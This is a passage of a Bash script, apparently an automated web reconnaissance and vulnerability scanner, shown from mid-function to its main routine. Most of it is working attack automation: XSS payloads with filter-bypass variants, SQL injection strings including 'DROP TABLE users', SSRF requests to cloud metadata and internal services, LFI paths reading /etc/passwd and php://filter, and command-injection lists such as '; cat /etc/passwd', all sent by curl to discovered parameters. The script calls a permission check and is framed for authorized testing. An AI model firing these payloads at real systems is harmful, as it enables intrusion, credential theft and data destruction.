    # Check content-type for non-HTML responses
    local content_type=$(curl -s -I --max-time 10 "$test_url" | grep -i "content-type" | head -1)
    if echo "$content_type" | grep -qvE "(text/html|application/xhtml)"; then
        return 0  # Is false positive
    fi
    
    return 1  # Not a false positive
}

# SQL Injection False Positive Detection
is_false_positive_sqli() {
    local response="$1"
    local test_url="$2"
    local response_time="$3"
    
    # Check for generic error pages
    if echo "$response" | grep -qiE "(404|not found|access denied|forbidden)"; then
        return 0  # Is false positive
    fi
    
    # Check if time delay is due to network issues
    if [[ $response_time -gt 4 ]]; then
        # Test baseline response time
        local baseline_start=$(date +%s)
        curl -s --max-time 10 "${test_url%\?*}" > /dev/null 2>&1
        local baseline_end=$(date +%s)
        local baseline_time=$((baseline_end - baseline_start))
        
        # If baseline is also slow, likely network issue
        if [[ $baseline_time -gt 3 ]]; then
            return 0  # Is false positive
        fi
    fi
    
    return 1  # Not a false positive
}

# SSRF False Positive Detection
is_false_positive_ssrf() {
    local response="$1"
    local test_url="$2"
    
    # Check for error responses
    if echo "$response" | grep -qiE "(404|not found|timeout|connection refused)"; then
        return 0  # Is false positive
    fi
    
    # Check if response is just echoing the payload
    if echo "$test_url" | grep -q "169.254.169.254" && ! echo "$response" | grep -qE "(ami-|instance-id|security-groups)"; then
        return 0  # Is false positive
    fi
    
    return 1  # Not a false positive
}

# Advanced Payload Generator
generate_custom_payloads() {
    local vuln_type="$1"
    local target_url="$2"
    
    case "$vuln_type" in
        "xss")
            # Context-aware XSS payloads
            if echo "$target_url" | grep -q "search\|query\|q="; then
                echo "<script>alert('SEARCH_XSS')</script>"
                echo "'\"><img src=x onerror=alert('SEARCH_XSS')>"
            elif echo "$target_url" | grep -q "name\|user\|profile"; then
                echo "<svg onload=alert('PROFILE_XSS')>"
                echo "javascript:alert('PROFILE_XSS')"
            else
                echo "<script>alert('GENERIC_XSS')</script>"
            fi
            ;;
        "sqli")
            # Database-specific payloads
            echo "' OR 1=1--"
            echo "' UNION SELECT @@version--"
            echo "'; WAITFOR DELAY '00:00:05'--"
            echo "' OR pg_sleep(5)--"
            ;;
        "ssrf")
            # Environment-specific SSRF payloads
            echo "http://169.254.169.254/latest/meta-data/"
            echo "http://metadata.google.internal/computeMetadata/v1/"
            echo "http://127.0.0.1:6379/info"
            ;;
    esac
}

# Intelligent Vulnerability Scoring
calculate_vulnerability_score() {
    local vuln_type="$1"
    local context="$2"
    local response="$3"
    
    local base_score=0
    
    case "$vuln_type" in
        "xss")
            base_score=7
            # Increase score for reflected XSS in sensitive contexts
            if echo "$context" | grep -qE "(admin|login|auth|payment)"; then
                base_score=$((base_score + 2))
            fi
            # Check for DOM XSS indicators
            if echo "$response" | grep -qE "(document\.write|innerHTML|eval)"; then
                base_score=$((base_score + 1))
            fi
            ;;
        "sqli")
            base_score=9
            # Increase for time-based (blind) SQLi
            if echo "$context" | grep -q "time_based"; then
                base_score=$((base_score + 1))
            fi
            ;;
        "ssrf")
            base_score=8
            # Increase for cloud metadata access
            if echo "$response" | grep -qE "(ami-|instance-id|security-groups)"; then
                base_score=$((base_score + 2))
            fi
            ;;
        "lfi")
            base_score=7
            # Increase for system file access
            if echo "$response" | grep -qE "(root:|passwd:|shadow:)"; then
                base_score=$((base_score + 2))
            fi
            ;;
        "cmd_injection")
            base_score=9
            # Maximum score for command execution
            if echo "$response" | grep -qE "(uid=|gid=)"; then
                base_score=10
            fi
            ;;
    esac
    
    echo "$base_score"
}

# ===============================================
# ADVANCED AI-POWERED VULNERABILITY TESTING
# ===============================================

# Advanced XSS Testing with AI Payloads
advanced_xss_testing() {
    log_info "Starting AI-powered XSS testing..."
    
    local xss_dir="$WORKSPACE_DIR/vulnerabilities/advanced_xss"
    mkdir -p "$xss_dir"
    
    local params_file="$WORKSPACE_DIR/parameters/discovered_params.txt"
    if [[ ! -f "$params_file" ]]; then
        log_warn "No parameters found for XSS testing"
        return
    fi
    
    # AI-generated XSS payloads
    local ai_xss_payloads=(
        "<script>alert('XSS-AI-1')</script>"
        "javascript:alert('XSS-AI-2')"
        "'\"><script>alert('XSS-AI-3')</script>"
        "<img src=x onerror=alert('XSS-AI-4')>"
        "<svg onload=alert('XSS-AI-5')>"
        "';alert('XSS-AI-6');//"
        "\"><script>alert('XSS-AI-7')</script>"
        "<iframe src=javascript:alert('XSS-AI-8')>"
        "<body onload=alert('XSS-AI-9')>"
        "<details open ontoggle=alert('XSS-AI-10')>"
    )
    
    # Advanced bypass payloads
    local bypass_payloads=(
        "<ScRiPt>alert('BYPASS-1')</ScRiPt>"
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        "<img src=\"x\" onerror=\"alert('BYPASS-2')\">"
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        "<svg><animatetransform onbegin=alert('BYPASS-3')>"
        "<math><mi//xlink:href=\"data:x,<script>alert('BYPASS-4')</script>\">"
    )
    
    while read -r param_url; do
        local base_url=$(echo "$param_url" | cut -d'?' -f1)
        local param_part=$(echo "$param_url" | cut -d'?' -f2)
        
        for payload in "${ai_xss_payloads[@]}" "${bypass_payloads[@]}"; do
            local encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
            local test_url="${base_url}?${param_part/FUZZ/$encoded_payload}"
            
            local response=$(curl -s -L --max-time 15 "$test_url" 2>/dev/null || true)
            
            # Check if payload is actually executed (reflected unescaped in HTML context)
            if echo "$response" | grep -qE "<script[^>]*>.*alert\(|<img[^>]*onerror[^>]*=|<svg[^>]*onload[^>]*=|javascript:.*alert\("; then
                # Additional validation - check if it's in executable context
                if echo "$response" | grep -qE "<script[^>]*>.*('XSS-AI'|\"XSS-AI\"|'BYPASS'|\"BYPASS\")|<img[^>]*onerror[^>]*=[^>]*('XSS-AI'|\"XSS-AI\"|'BYPASS'|\"BYPASS\")|<svg[^>]*onload[^>]*=[^>]*('XSS-AI'|\"XSS-AI\"|'BYPASS'|\"BYPASS\")"; then
                    # Intelligent false positive reduction
                    if ! is_false_positive_xss "$response" "$test_url"; then
                        echo "CONFIRMED_XSS: $test_url" >> "$xss_dir/confirmed_xss.txt"
                        send_critical_alert "XSS vulnerability confirmed: $base_url"
                    
                        # AI analysis of the XSS
                        local ai_analysis=$(ai_analyze_vulnerability "$test_url" "Confirmed XSS vulnerability")
                        echo "URL: $test_url" > "$xss_dir/xss_$(date +%s).txt"
                        echo "Payload: $payload" >> "$xss_dir/xss_$(date +%s).txt"
                        echo "AI Analysis:" >> "$xss_dir/xss_$(date +%s).txt"
                        echo "$ai_analysis" >> "$xss_dir/xss_$(date +%s).txt"
                    else
                        echo "FALSE_POSITIVE_XSS: $test_url" >> "$xss_dir/false_positives.txt"
                    fi
                fi
            fi
        done
    done < "$params_file"
}

# Advanced SQL Injection Testing
advanced_sqli_testing() {
    log_info "Starting AI-powered SQL injection testing..."
    
    local sqli_dir="$WORKSPACE_DIR/vulnerabilities/advanced_sqli"
    mkdir -p "$sqli_dir"
    
    local params_file="$WORKSPACE_DIR/parameters/discovered_params.txt"
    if [[ ! -f "$params_file" ]]; then
        log_warn "No parameters found for SQLi testing"
        return
    fi
    
    # Advanced SQLi payloads
    local sqli_payloads=(
        "' OR '1'='1"
        "' OR 1=1--"
        "' UNION SELECT NULL,NULL,NULL--"
        "'; DROP TABLE users;--"
        "' OR SLEEP(5)--"
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        "' OR (SELECT user FROM mysql.user LIMIT 1)='root'--"
        "' UNION SELECT @@version,NULL,NULL--"
        "'; WAITFOR DELAY '00:00:05'--"
        "' OR pg_sleep(5)--"
    )
    
    while read -r param_url; do
        local base_url=$(echo "$param_url" | cut -d'?' -f1)
        local param_part=$(echo "$param_url" | cut -d'?' -f2)
        
        for payload in "${sqli_payloads[@]}"; do
            local encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
            local test_url="${base_url}?${param_part/FUZZ/$encoded_payload}"
            
            local start_time=$(date +%s)
            local response=$(curl -s -L --max-time 20 "$test_url" 2>/dev/null || true)
            local end_time=$(date +%s)
            local response_time=$((end_time - start_time))
            
            # Check for SQL errors
            if echo "$response" | grep -qiE "(mysql|sql|oracle|postgres|sqlite|mssql|error|warning|exception)"; then
                echo "POTENTIAL_SQLI: $test_url" >> "$sqli_dir/potential_sqli.txt"
                log_warn "Potential SQL injection: $base_url"
            fi
            
            # Time-based detection with false positive filtering
            if [[ $response_time -gt 4 ]]; then
                if ! is_false_positive_sqli "$response" "$test_url" "$response_time"; then
                    local vuln_score=$(calculate_vulnerability_score "sqli" "time_based" "$response")
                    echo "TIME_BASED_SQLI: $test_url (${response_time}s) [Score: $vuln_score/10]" >> "$sqli_dir/time_based_sqli.txt"
                    send_critical_alert "Time-based SQL injection: $base_url (Score: $vuln_score/10)"
                    
                    # AI analysis
                    local ai_analysis=$(ai_analyze_vulnerability "$test_url" "Time-based SQL injection detected with score $vuln_score/10")
                    echo "URL: $test_url" > "$sqli_dir/sqli_$(date +%s).txt"
                    echo "Response Time: ${response_time}s" >> "$sqli_dir/sqli_$(date +%s).txt"
                    echo "Vulnerability Score: $vuln_score/10" >> "$sqli_dir/sqli_$(date +%s).txt"
                    echo "AI Analysis:" >> "$sqli_dir/sqli_$(date +%s).txt"
                    echo "$ai_analysis" >> "$sqli_dir/sqli_$(date +%s).txt"
                else
                    echo "FALSE_POSITIVE_SQLI: $test_url (${response_time}s)" >> "$sqli_dir/false_positives.txt"
                fi
            fi
        done
    done < "$params_file"
}

# Advanced SSRF Testing
advanced_ssrf_testing() {
    log_info "Starting SSRF vulnerability testing..."
    
    local ssrf_dir="$WORKSPACE_DIR/vulnerabilities/ssrf"
    mkdir -p "$ssrf_dir"
    
    local params_file="$WORKSPACE_DIR/parameters/discovered_params.txt"
    if [[ ! -f "$params_file" ]]; then
        log_warn "No parameters found for SSRF testing"
        return
    fi
    
    # SSRF payloads targeting internal services
    local ssrf_payloads=(
        "http://169.254.169.254/latest/meta-data/"
        "http://127.0.0.1:80"
        "http://127.0.0.1:22"
        "http://127.0.0.1:3306"
        "http://127.0.0.1:6379"
        "http://localhost:8080"
        "file:///etc/passwd"
        "file:///proc/version"
        "gopher://127.0.0.1:6379/_INFO"
        "dict://127.0.0.1:11211/stats"
    )
    
    while read -r param_url; do
        local base_url=$(echo "$param_url" | cut -d'?' -f1)
        local param_part=$(echo "$param_url" | cut -d'?' -f2)
        
        for payload in "${ssrf_payloads[@]}"; do
            local encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
            local test_url="${base_url}?${param_part/FUZZ/$encoded_payload}"
            
            local response=$(curl -s -L --max-time 15 "$test_url" 2>/dev/null || true)
            
            # Check for SSRF indicators
            if echo "$response" | grep -qE "(root:|ec2|ami-|instance-id|local-hostname|security-groups)"; then
                echo "CONFIRMED_SSRF: $test_url" >> "$ssrf_dir/confirmed_ssrf.txt"
                send_critical_alert "SSRF vulnerability confirmed: $base_url"
                
                # AI analysis
                local ai_analysis=$(ai_analyze_vulnerability "$test_url" "SSRF vulnerability accessing internal resources")
                echo "URL: $test_url" > "$ssrf_dir/ssrf_$(date +%s).txt"
                echo "AI Analysis:" >> "$ssrf_dir/ssrf_$(date +%s).txt"
                echo "$ai_analysis" >> "$ssrf_dir/ssrf_$(date +%s).txt"
            fi
        done
    done < "$params_file"
}

# Advanced LFI/RFI Testing
advanced_lfi_testing() {
    log_info "Starting LFI/RFI vulnerability testing..."
    
    local lfi_dir="$WORKSPACE_DIR/vulnerabilities/lfi"
    mkdir -p "$lfi_dir"
    
    local params_file="$WORKSPACE_DIR/parameters/discovered_params.txt"
    if [[ ! -f "$params_file" ]]; then
        log_warn "No parameters found for LFI testing"
        return
    fi
    
    # LFI payloads
    local lfi_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "/etc/passwd"
        "/proc/version"
        "/proc/self/environ"
        "php://filter/read=convert.base64-encode/resource=index.php"
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        "expect://id"
        "/var/log/apache2/access.log"
        "/var/log/nginx/access.log"
    )
    
    while read -r param_url; do
        local base_url=$(echo "$param_url" | cut -d'?' -f1)
        local param_part=$(echo "$param_url" | cut -d'?' -f2)
        
        for payload in "${lfi_payloads[@]}"; do
            local encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
            local test_url="${base_url}?${param_part/FUZZ/$encoded_payload}"
            
            local response=$(curl -s -L --max-time 15 "$test_url" 2>/dev/null || true)
            
            # Check for LFI indicators
            if echo "$response" | grep -qE "(root:|bin:|daemon:|www-data|nginx|apache)"; then
                echo "CONFIRMED_LFI: $test_url" >> "$lfi_dir/confirmed_lfi.txt"
                send_critical_alert "LFI vulnerability confirmed: $base_url"
                
                # AI analysis
                local ai_analysis=$(ai_analyze_vulnerability "$test_url" "Local File Inclusion vulnerability")
                echo "URL: $test_url" > "$lfi_dir/lfi_$(date +%s).txt"
                echo "AI Analysis:" >> "$lfi_dir/lfi_$(date +%s).txt"
                echo "$ai_analysis" >> "$lfi_dir/lfi_$(date +%s).txt"
            fi
        done
    done < "$params_file"
}

# Command Injection Testing
advanced_command_injection_testing() {
    log_info "Starting command injection testing..."
    
    local cmd_dir="$WORKSPACE_DIR/vulnerabilities/command_injection"
    mkdir -p "$cmd_dir"
    
    local params_file="$WORKSPACE_DIR/parameters/discovered_params.txt"
    if [[ ! -f "$params_file" ]]; then
        log_warn "No parameters found for command injection testing"
        return
    fi
    
    # Command injection payloads
    local cmd_payloads=(
        "; id"
        "| id"
        "&& id"
        "|| id"
        "; whoami"
        "| whoami"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        "; sleep 5"
        "| sleep 5"
        "\`id\`"
        "\$(id)"
        "; uname -a"
        "| uname -a"
    )
    
    while read -r param_url; do
        local base_url=$(echo "$param_url" | cut -d'?' -f1)
        local param_part=$(echo "$param_url" | cut -d'?' -f2)
        
        for payload in "${cmd_payloads[@]}"; do
            local encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
            local test_url="${base_url}?${param_part/FUZZ/$encoded_payload}"
            
            local start_time=$(date +%s)
            local response=$(curl -s -L --max-time 20 "$test_url" 2>/dev/null || true)
            local end_time=$(date +%s)
            local response_time=$((end_time - start_time))
            
            # Check for command execution indicators
            if echo "$response" | grep -qE "(uid=|gid=|groups=|Linux|GNU|root|bin|daemon)"; then
                echo "CONFIRMED_CMD_INJECTION: $test_url" >> "$cmd_dir/confirmed_cmd.txt"
                send_critical_alert "Command injection confirmed: $base_url"
                
                # AI analysis
                local ai_analysis=$(ai_analyze_vulnerability "$test_url" "Command injection vulnerability")
                echo "URL: $test_url" > "$cmd_dir/cmd_$(date +%s).txt"
                echo "AI Analysis:" >> "$cmd_dir/cmd_$(date +%s).txt"
                echo "$ai_analysis" >> "$cmd_dir/cmd_$(date +%s).txt"
            fi
            
            # Time-based detection for blind command injection
            if [[ $response_time -gt 4 ]] && echo "$payload" | grep -q "sleep"; then
                echo "TIME_BASED_CMD: $test_url (${response_time}s)" >> "$cmd_dir/time_based_cmd.txt"
                send_critical_alert "Blind command injection: $base_url"
            fi
        done
    done < "$params_file"
}

# AI-Powered Vulnerability Prioritization
ai_vulnerability_prioritization() {
    log_info "Running AI-powered vulnerability prioritization..."
    
    local ai_reports_dir="$WORKSPACE_DIR/ai_reports"
    mkdir -p "$ai_reports_dir"
    
    # Collect all vulnerability findings
    local all_vulns=""
    
    # XSS findings
    if [[ -f "$WORKSPACE_DIR/vulnerabilities/advanced_xss/confirmed_xss.txt" ]]; then
        all_vulns+="XSS Vulnerabilities:\n$(cat "$WORKSPACE_DIR/vulnerabilities/advanced_xss/confirmed_xss.txt")\n\n"
    fi
    
    # SQLi findings
    if [[ -f "$WORKSPACE_DIR/vulnerabilities/advanced_sqli/time_based_sqli.txt" ]]; then
        all_vulns+="SQL Injection Vulnerabilities:\n$(cat "$WORKSPACE_DIR/vulnerabilities/advanced_sqli/time_based_sqli.txt")\n\n"
    fi
    
    # SSRF findings
    if [[ -f "$WORKSPACE_DIR/vulnerabilities/ssrf/confirmed_ssrf.txt" ]]; then
        all_vulns+="SSRF Vulnerabilities:\n$(cat "$WORKSPACE_DIR/vulnerabilities/ssrf/confirmed_ssrf.txt")\n\n"
    fi
    
    # LFI findings
    if [[ -f "$WORKSPACE_DIR/vulnerabilities/lfi/confirmed_lfi.txt" ]]; then
        all_vulns+="LFI Vulnerabilities:\n$(cat "$WORKSPACE_DIR/vulnerabilities/lfi/confirmed_lfi.txt")\n\n"
    fi
    
    # Command injection findings
    if [[ -f "$WORKSPACE_DIR/vulnerabilities/command_injection/confirmed_cmd.txt" ]]; then
        all_vulns+="Command Injection Vulnerabilities:\n$(cat "$WORKSPACE_DIR/vulnerabilities/command_injection/confirmed_cmd.txt")\n\n"
    fi
    
    if [[ -n "$all_vulns" ]]; then
        local ai_priority_analysis=$(ai_analyze_vulnerability "$all_vulns" "Complete vulnerability assessment for prioritization and remediation planning")
        
        cat > "$ai_reports_dir/vulnerability_prioritization.txt" << EOF
═══════════════════════════════════════════════════════════════
                    AI VULNERABILITY PRIORITIZATION
═══════════════════════════════════════════════════════════════

Target: $TARGET_DOMAIN
Analysis Date: $(date)

$ai_priority_analysis

═══════════════════════════════════════════════════════════════
Raw Findings:
$all_vulns
EOF
        
        log_success "AI vulnerability prioritization completed"
        send_telegram_alert "AI analysis completed with prioritized vulnerability recommendations"
    fi
}

# ===============================================
# FINAL SUMMARY
# ===============================================

final_summary() {
    local end_time=$(date +%s)
    local duration=$((end_time - SCRIPT_START_TIME))
    local duration_minutes=$((duration / 60))
    
    echo ""
    log_success "═══════════════════════════════════════════════════════════════"
    log_success "🎯 RECONNAISSANCE COMPLETED!"
    log_success "═══════════════════════════════════════════════════════════════"
    log_success "Target: $TARGET_DOMAIN"
    log_success "Duration: $duration_minutes minutes"
    log_success "Workspace: $WORKSPACE_DIR"
    
    echo ""
    log_success "📊 KEY FINDINGS:"
    log_success "• Subdomains: $(wc -l < "$WORKSPACE_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo "0")"
    log_success "• Live Services: $(wc -l < "$WORKSPACE_DIR/urls/alive_urls.txt" 2>/dev/null || echo "0")"
    log_success "• Total URLs: $(wc -l < "$WORKSPACE_DIR/urls/all_urls.txt" 2>/dev/null || echo "0")"
    log_success "• Vulnerabilities: $(find "$WORKSPACE_DIR/vulnerabilities" -name "*.txt" -exec wc -l {} + 2>/dev/null | tail -1 | awk '{print $1}' || echo "0")"
    
    echo ""
    log_success "📋 REPORTS GENERATED:"
    log_success "• Executive Summary: $REPORTS_DIR/executive_summary.txt"
    log_success "• Technical Report: $REPORTS_DIR/technical_report.txt"
    
    echo ""
    log_success "🚨 NEXT STEPS:"
    log_success "1. Review executive summary"
    log_success "2. Verify findings manually"
    log_success "3. Prioritize critical issues"
    log_success "4. Implement fixes"
    log_success "═══════════════════════════════════════════════════════════════"
}

# ===============================================
# MAIN EXECUTION
# ===============================================

main() {
    # Check arguments
    if [ $# -eq 0 ]; then
        show_help
        exit 1
    fi
    
    if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]; then
        show_help
        exit 0
    fi
    
    # Setup
    setup_environment "$1"
    confirm_permission
    
    log_info "Starting comprehensive reconnaissance..."
    
    # Run all phases
    phase_subdomain_enumeration
    phase_port_scanning
    phase_http_discovery
    phase_web_crawling
    phase_javascript_analysis
    phase_parameter_discovery
    phase_vulnerability_testing
    
    # Advanced AI-powered testing phases
    advanced_xss_testing
    advanced_sqli_testing
    advanced_ssrf_testing
    advanced_lfi_testing
    advanced_command_injection_testing
    
    phase_content_discovery
    phase_security_headers
    
    # AI analysis and reporting
    ai_vulnerability_prioritization
    generate_reports
    
    # Final summary
    final_summary
}

# Handle Ctrl+C
trap 'echo -e "\n${RED}Assessment interrupted${NC}"; exit 130' INT

# Run main function
main "$@"